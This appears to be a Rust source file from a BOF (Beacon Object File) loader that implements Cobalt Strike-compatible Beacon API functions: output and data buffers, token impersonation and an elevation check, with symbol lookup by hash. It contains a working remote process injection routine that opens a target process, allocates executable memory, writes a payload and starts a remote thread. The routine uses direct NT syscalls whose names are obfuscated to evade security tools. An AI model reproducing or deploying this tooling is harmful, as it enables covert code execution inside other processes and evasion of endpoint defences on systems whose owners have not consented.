use alloc::{
    string::{String, ToString},
    vec::Vec,
};
use core::{
    alloc::Layout,
    ffi::{CStr, c_void},
    ffi::{c_char, c_int, c_short},
    fmt,
    ptr::{self, null_mut},
};

use spin::Mutex;
use obfstr::obfstr as s;
use dinvk::{winapis::NtCurrentProcess, syscall};
use dinvk::{types::OBJECT_ATTRIBUTES, hash::jenkins3};
use windows_sys::Win32::{
    Security::*,
    Foundation::{CloseHandle, HANDLE, STATUS_SUCCESS},
    System::{
        Threading::*,
        WindowsProgramming::CLIENT_ID,
        Memory::{
            MEM_COMMIT, 
            MEM_RESERVE, 
            PAGE_EXECUTE_READWRITE
        },
    },
};

use crate::error::{CoffeeLdrError, Result};

/// Global output buffer used by Beacon-compatible functions.
static BEACON_BUFFER: Mutex<BeaconOutputBuffer> = Mutex::new(BeaconOutputBuffer::new());

/// A buffer used for managing and collecting output for the beacon.
#[repr(C)]
#[derive(Debug, Clone)]
pub struct BeaconOutputBuffer {
    /// Internal buffer that stores the output data as a vector of `c_char`.
    pub buffer: Vec<c_char>,
}

impl BeaconOutputBuffer {
    /// Creates a new empty output buffer.
    const fn new() -> Self {
        Self { buffer: Vec::new() }
    }

    /// Appends raw C-style bytes to the internal buffer.
    ///
    /// Invalid pointers or negative lengths are ignored.
    fn append_char(&mut self, s: *mut c_char, len: c_int) {
        if s.is_null() || len <= 0 {
            return;
        }
        let tmp = unsafe { core::slice::from_raw_parts(s, len as usize) };
        self.buffer.extend_from_slice(tmp);
    }

    /// Appends plain Rust text to the buffer.
    fn append_string(&mut self, s: &str) {
        self.buffer.extend(s.bytes().map(|b| b as c_char));
    }

    /// Returns the current buffer pointer and size, and clears the buffer.
    ///
    /// This behaves exactly like the Beacon BOF runtime.
    fn get_output(&mut self) -> (*mut c_char, usize) {
        let size = self.buffer.len();
        let ptr = self.buffer.as_mut_ptr();
        self.buffer.clear();
        (ptr, size)
    }

    /// Clears all output data stored in the buffer.
    pub fn clear(&mut self) {
        self.buffer.clear();
    }
}

impl fmt::Display for BeaconOutputBuffer {
    /// Converts the internal buffer into a Rust `String`.
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let string = self
            .buffer
            .iter()
            .map(|&c| if c as u8 == 0 { '\n' } else { c as u8 as char })
            .collect::<String>();
        write!(f, "{string}")
    }
}

#[repr(C)]
#[derive(Debug, Clone, Copy)]
struct Data {
    /// The original buffer.
    original: *mut c_char,

    /// Current pointer into our buffer.
    buffer: *mut c_char,

    /// Remaining length of data.
    length: c_int,

    /// Total size of this buffer.
    size: c_int,
}

#[repr(C)]
#[derive(Debug, Clone, Copy)]
struct Format {
    /// The original buffer.
    original: *mut c_char,

    /// Current pointer into our buffer.
    buffer: *mut c_char,

    /// Remaining length of data.
    length: c_int,

    /// Total size of this buffer.
    size: c_int,
}

/// Resolves the internal address of a built-in Beacon function.
///
/// The lookup uses a Jenkins hash of the symbol name to match the
/// internal function used by BOF payloads.
///
/// # Errors
///
/// Fails when the requested function is not mapped to any known internal handler.
pub fn get_function_internal_address(name: &str) -> Result<usize> {
    match jenkins3(name) {
        // Output
        3210322847u32 => Ok(beacon_printf as *const () as usize),
        358755801u32 => Ok(beacon_output as *const () as usize),
        2979319955u32 => Ok(beacon_get_output_data as *const () as usize),

        // Token
        3202664826u32 => Ok(beacon_is_admin as *const () as usize),
        233171701u32 => Ok(beacon_use_token as *const () as usize),
        2754379686u32 => Ok(beacon_rever_token as *const () as usize),

        // Format
        1870274128u32 => Ok(beacon_format_int as *const () as usize),
        1617256401u32 => Ok(beacon_format_free as *const () as usize),
        687949845u32 => Ok(beacon_format_alloc as *const () as usize),
        305071883u32 => Ok(beacon_format_reset as *const () as usize),
        2824797381u32 => Ok(beacon_formt_printf as *const () as usize),
        814630661u32 => Ok(beacon_format_append as *const () as usize),
        2821454172u32 => Ok(beacon_format_to_string as *const () as usize),

        // Process / injection
        3748796315u32 => Ok(beacon_get_spawn_to as *const () as usize),
        1991785755u32 => Ok(beacon_inject_process as *const () as usize),
        2335479872u32 => Ok(beacon_cleanup_process as *const () as usize),
        2755057638u32 => Ok(beacon_spawn_temporary_process as *const () as usize),
        131483084u32 => Ok(beacon_inject_temporary_process as *const () as usize),

        // Data
        1942020652u32 => Ok(beacon_data_int as *const () as usize),
        1136370979u32 => Ok(beacon_data_short as *const () as usize),
        709123669u32 => Ok(beacon_data_parse as *const () as usize),
        2194280572u32 => Ok(beacon_data_length as *const () as usize),
        596399976u32 => Ok(beacon_data_extract as *const () as usize),
        275872794u32 => Ok(beacon_data_ptr as *const () as usize),

        // Utils
        2580203873u32 => Ok(to_wide_char as *const () as usize),
        3816160102u32 => Ok(0),
        _ => Err(CoffeeLdrError::FunctionInternalNotFound(name.to_string())),
    }
}

/// Retrieves the current Beacon output buffer.
///
/// If no output has been produced, returns `None`.
/// Otherwise returns a cloned snapshot and clears the internal buffer.
pub fn get_output_data() -> Option<BeaconOutputBuffer> {
    let mut beacon = BEACON_BUFFER.lock();
    if beacon.buffer.is_empty() {
        return None;
    }

    let output = beacon.clone();
    beacon.clear();

    Some(output)
}

/// Allocates a new `Format` buffer for Beacon-formatting operations.
///
/// Allocation uses zeroed memory and behaves like the standard BOF runtime.
fn beacon_format_alloc(format: *mut Format, max: c_int) {
    if format.is_null() || max == 0 {
        return;
    }

    let layout_result = Layout::from_size_align(max as usize, Layout::new::<i8>().align());
    if let Ok(layout) = layout_result {
        unsafe {
            let original = alloc::alloc::alloc_zeroed(layout).cast::<i8>();
            (*format).original = original;
            (*format).buffer = original;
            (*format).length = 0;
            (*format).size = max;
        }
    }
}

/// Clears the contents of a `Format` buffer by zeroing it.
///
/// The pointer is reset back to the beginning.
fn beacon_format_reset(format: *mut Format) {
    if format.is_null() {
        return;
    }

    unsafe {
        ptr::write_bytes((*format).original, 0, (*format).size as usize);
        (*format).buffer = (*format).original;
        (*format).length = (*format).size;
    }
}

/// Converts the contents of a `Format` buffer into a C-style string.
///
/// Returns a pointer to the underlying buffer.
fn beacon_format_to_string(format: *mut Format, size: *mut c_int) -> *mut c_char {
    if format.is_null() || size.is_null() {
        return null_mut();
    }

    unsafe {
        (*size) = (*format).length;
        (*format).original
    }
}

/// Appends a big-endian integer to the format buffer.
fn beacon_format_int(format: *mut Format, value: c_int) {
    if format.is_null() {
        return;
    }

    unsafe {
        if (*format).length + 4 > (*format).size {
            return;
        }

        let outdata = swap_endianness(value as u32).to_be_bytes();
        ptr::copy_nonoverlapping(outdata.as_ptr(), (*format).buffer as *mut u8, 4);

        (*format).buffer = (*format).buffer.add(4);
        (*format).length += 4;
    }
}

/// Appends arbitrary raw bytes to a `Format` buffer.
fn beacon_format_append(format: *mut Format, text: *const c_char, len: c_int) {
    if format.is_null() || text.is_null() || len <= 0 {
        return;
    }

    unsafe {
        if (*format).length + len > (*format).size {
            return;
        }

        ptr::copy_nonoverlapping(text, (*format).buffer, len as usize);
        (*format).buffer = (*format).buffer.add(len as usize);
        (*format).length += len;
    }
}

/// Frees the memory associated with a `Format` buffer.
fn beacon_format_free(format: *mut Format) {
    if format.is_null() {
        return;
    }

    unsafe {
        if !(*format).original.is_null() {
            let layout_result = Layout::from_size_align((*format).size as usize, Layout::new::<i8>().align());
            if let Ok(layout) = layout_result {
                alloc::alloc::dealloc((*format).original as *mut u8, layout);
                (*format).original = null_mut();
            }
        }

        (*format).buffer = null_mut();
        (*format).length = 0;
        (*format).size = 0;
    }
}

/// Formats a string using printf-style formatting and appends the result
/// to a `Format` buffer.
///
/// Follows the behavior of Beacon’s `beacon_formt_printf`.
#[unsafe(no_mangle)]
unsafe extern "C" fn beacon_formt_printf(format: *mut Format, fmt: *const c_char, mut args: ...) {
    if format.is_null() || fmt.is_null() {
        return;
    }

    let fmt_str = CStr::from_ptr(fmt).to_str().unwrap_or("");
    let mut temp_str = String::new();

    printf_compat::format(fmt_str.as_ptr().cast(), args.as_va_list(), printf_compat::output::fmt_write(&mut temp_str));

    let length_needed = temp_str.len() as c_int;
    if (*format).length + length_needed >= (*format).size {
        return;
    }

    ptr::copy_nonoverlapping(
        temp_str.as_ptr() as *const c_char,
        (*format).buffer.add((*format).length as usize),
        length_needed as usize,
    );

    (*format).length += length_needed;
}

/// Extracts a 2-byte value from a Beacon `Data` buffer.
fn beacon_data_short(data: *mut Data) -> c_short {
    if data.is_null() {
        return 0;
    }

    let parser = unsafe { &mut *data };
    if parser.length < 2 {
        return 0;
    }

    let result = unsafe { ptr::read_unaligned(parser.buffer as *const i16) };
    parser.buffer = unsafe { parser.buffer.add(2) };
    parser.length -= 2;

    result as c_short
}

/// Extracts a 4-byte value from a Beacon `Data` buffer.
fn beacon_data_int(data: *mut Data) -> c_int {
    if data.is_null() {
        return 0;
    }

    let parser = unsafe { &mut *data };
    if parser.length < 4 {
        return 0;
    }

    let result = unsafe { ptr::read_unaligned(parser.buffer as *const i32) };
    parser.buffer = unsafe { parser.buffer.add(4) };
    parser.length -= 4;

    result as c_int
}

/// Extracts an arbitrary-length blob from a `Data` buffer.
fn beacon_data_extract(data: *mut Data, size: *mut c_int) -> *mut c_char {
    if data.is_null() {
        return null_mut();
    }

    let parser = unsafe { &mut *data };
    if parser.length < 4 {
        return null_mut();
    }

    let length = unsafe { ptr::read_unaligned(parser.buffer as *const u32) };
    let outdata = unsafe { parser.buffer.add(4) };
    if outdata.is_null() {
        return null_mut();
    }

    parser.buffer = unsafe { parser.buffer.add(4 + length as usize) };
    parser.length -= 4 + length as c_int;
    if !size.is_null() && !outdata.is_null() {
        unsafe {
            *size = length as c_int;
        }
    }

    outdata as *mut c_char
}

/// Initializes a `Data` parser over a raw buffer.
fn beacon_data_parse(data: *mut Data, buffer: *mut c_char, size: c_int) {
    if data.is_null() {
        return;
    }

    unsafe {
        (*data).original = buffer;
        (*data).buffer = buffer.add(4);
        (*data).length = size - 4;
        (*data).size = size - 4;
    }
}

/// Returns the remaining data length in a `Data` parser.
fn beacon_data_length(data: *const Data) -> c_int {
    if data.is_null() {
        return 0;
    }

    unsafe { (*data).length }
}

/// Returns the collected Beacon output and size as raw bytes.
fn beacon_get_output_data(outsize: *mut c_int) -> *mut c_char {
    unsafe {
        let mut beacon = BEACON_BUFFER.lock();
        let (ptr, size) = beacon.get_output();

        if !outsize.is_null() {
            *outsize = size as c_int;
        }

        ptr
    }
}

/// Appends raw output data into the Beacon output buffer.
fn beacon_output(_type: c_int, data: *mut c_char, len: c_int) {
    let mut buffer = BEACON_BUFFER.lock();
    buffer.append_char(data, len);
}

/// Formats a string using Beacon’s printf mechanism and stores it.
#[unsafe(no_mangle)]
unsafe extern "C" fn beacon_printf(_type: c_int, fmt: *mut c_char, mut args: ...) {
    let mut str = String::new();
    printf_compat::format(fmt, args.as_va_list(), printf_compat::output::fmt_write(&mut str));
    str.push('\0');

    let mut buffer = BEACON_BUFFER.lock();
    buffer.append_string(&str);
}

/// Reverts any impersonated token back to the original process token.
fn beacon_rever_token() {
    unsafe {
        if RevertToSelf() == 0 {
            log::warn!("RevertToSelf Failed!")
        }
    }
}

/// Applies a token to the current thread.
fn beacon_use_token(token: HANDLE) -> i32 {
    unsafe { SetThreadToken(null_mut(), token) }
}

/// Closes handles associated with a spawned process.
fn beacon_cleanup_process(info: *const PROCESS_INFORMATION) {
    unsafe {
        CloseHandle((*info).hProcess);
        CloseHandle((*info).hThread);
    }
}

/// Checks whether the current process is elevated (admin token).
fn beacon_is_admin() -> u32 {
    let mut h_token = null_mut();

    unsafe {
        if OpenProcessToken(NtCurrentProcess(), TOKEN_QUERY, &mut h_token) != 0 {
            let mut elevation = TOKEN_ELEVATION { TokenIsElevated: 0 };
            let mut return_length = 0;

            if GetTokenInformation(
                h_token,
                TokenElevation,
                &mut elevation as *mut _ as *mut c_void,
                size_of::<TOKEN_ELEVATION>() as u32,
                &mut return_length,
            ) != 0
            {
                return (elevation.TokenIsElevated == 1) as u32;
            }
        }
    }

    0
}

/// Converts endianness of a 32-bit integer.
fn swap_endianness(src: u32) -> u32 {
    // Check if the system is little-endian
    if cfg!(target_endian = "little") {
        // Small-endian to large-endian converter
        src.swap_bytes()
    } else {
        // If it is already big-endian, it returns the original value
        src
    }
}

/// Converts a C-string to UTF-16 and writes it into the destination buffer.
fn to_wide_char(src: *const c_char, dst: *mut u16, max: c_int) -> c_int {
    if src.is_null() || dst.is_null() || max < size_of::<u16>() as c_int {
        return 0;
    }

    unsafe {
        // Converting the `src` pointer to a C string
        let c_str = CStr::from_ptr(src);

        // Converts CStr to a Rust string
        if let Ok(str_slice) = c_str.to_str() {
            // Encoding a Rust string as UTF-16
            let utf16_chars = str_slice.encode_utf16().collect::<Vec<u16>>();
            let dst_slice = core::slice::from_raw_parts_mut(dst, (max as usize) / size_of::<u16>());

            let num_chars = utf16_chars.len();
            if num_chars >= dst_slice.len() {
                return 0; // Not enough space
            }

            // Copy the UTF-16 characters to the destination buffer
            dst_slice[..num_chars].copy_from_slice(&utf16_chars);

            // Adds the null-terminator
            dst_slice[num_chars] = 0;
        }
    }

    1
}

/// Performs remote process injection into a target process via NT syscalls.
fn beacon_inject_process(
    _h_process: HANDLE, 
    pid: c_int, 
    payload: *const c_char, 
    len: c_int, 
    _offset: c_char, 
    _arg: *const c_char, 
    _a_len: c_int
) {
    if payload.is_null() || len <= 0 {
        return;
    }

    unsafe {
        let mut oa = OBJECT_ATTRIBUTES::default();
        let mut ci = CLIENT_ID {
            UniqueProcess: pid as HANDLE,
            UniqueThread: null_mut(),
        };

        let mut h_process = null_mut::<c_void>();
        let status = syscall!(s!("NtOpenProcess"), &mut h_process, PROCESS_ALL_ACCESS, &mut oa, &mut ci);
        if status != Some(STATUS_SUCCESS) {
            return;
        }

        let mut size = len as usize;
        let mut address = null_mut::<c_void>();
        let mut status = syscall!(
            s!("NtAllocateVirtualMemory"),
            h_process,
            &mut address,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if status != Some(STATUS_SUCCESS) {
            CloseHandle(h_process);
            return;
        }

        let mut now = 0usize;
        status = syscall!(s!("NtWriteVirtualMemory"), h_process, address, payload as *const c_void, len as usize, &mut now);
        if status != Some(STATUS_SUCCESS) {
            CloseHandle(h_process);
            return;
        }

        let mut h_thread = null_mut::<c_void>();
        status = syscall!(
            s!("NtCreateThreadEx"),
            &mut h_thread,
            THREAD_ALL_ACCESS,
            null_mut::<c_void>(),
            h_process,
            address,
            null_mut::<c_void>(),
            0usize,
            0usize,
            0usize,
            0usize,
            null_mut::<c_void>()
        );

        if status != Some(STATUS_SUCCESS) || h_thread.is_null() {
            CloseHandle(h_process);
            return;
        }

        CloseHandle(h_thread);
        CloseHandle(h_process);
    }
}

/// Extracts a pointer to a region of the `Data` buffer.
fn beacon_data_ptr(data: *mut Data, size: c_int) -> *mut c_char {
    if data.is_null() || size <= 0 {
        return null_mut();
    }

    let parser = unsafe { &mut *data };
    if parser.length < size {
        return null_mut();
    }

    let result = parser.buffer;
    parser.buffer = unsafe { parser.buffer.add(size as usize) };
    parser.length -= size;

    result
}

/// Leaving this to be implemented by people needing/wanting it
fn beacon_inject_temporary_process(
    _info: *const PROCESS_INFORMATION,
    _payload: *const c_char,
    _len: c_int,
    _offset: c_int,
    _arg: *const c_char,
    _a_len: c_int,
) {
    unimplemented!()
}

/// Leaving this to be implemented by people needing/wanting it
fn beacon_spawn_temporary_process(
    _x86: i32, 
    _ignore_token: i32, 
    _s_info: *mut STARTUPINFOA, 
    _p_info: *mut PROCESS_INFORMATION
) {
    unimplemented!()
}

/// Leaving this to be implemented by people needing/wanting it
fn beacon_get_spawn_to(_x86: i32, _buffer: *const c_char, _length: c_int) {
    unimplemented!()
}
